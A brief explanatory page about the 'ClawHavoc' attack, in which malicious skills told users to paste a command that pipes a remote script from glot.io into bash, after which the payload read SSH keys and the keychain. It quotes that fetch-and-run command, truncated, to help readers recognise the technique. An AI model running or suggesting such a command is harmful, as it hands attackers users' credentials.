# How ClawHavoc worked

The malicious skills asked users to paste `curl -fsSL https://glot.io/... | bash`
into Terminal. The payload then read `~/.ssh` and the keychain. This page explains
the technique so you can recognise it; nothing here should be executed.
